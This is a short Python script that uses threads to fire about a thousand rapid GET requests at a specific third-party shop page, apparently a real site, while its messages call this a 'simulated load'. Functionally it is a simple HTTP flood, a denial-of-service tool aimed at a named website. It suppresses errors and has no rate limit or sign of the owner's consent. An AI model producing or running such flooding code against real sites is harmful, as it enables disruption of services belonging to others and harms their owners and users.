import threading
import time
import requests
import random

target_url = "https://www.snakaranavi.net/shop.php?sno=18710"  # Change this
virtual_multiplier = 100
visible_requests = 10
delay_range = (0.01, 0.03)

def send_virtual_request():
    try:
        requests.get(target_url, timeout=5)
    except Exception:
        pass

def send_batch(batch_number):
    print(f"🔄 Sending batch #{batch_number + 1}")
    for _ in range(virtual_multiplier):
        threading.Thread(target=send_virtual_request).start()
        time.sleep(random.uniform(*delay_range))

print(f"🚀 Starting simulated load on {target_url}")
for i in range(visible_requests):
    threading.Thread(target=send_batch, args=(i,)).start()
    time.sleep(0.5)

print("✅ Load simulation started.")
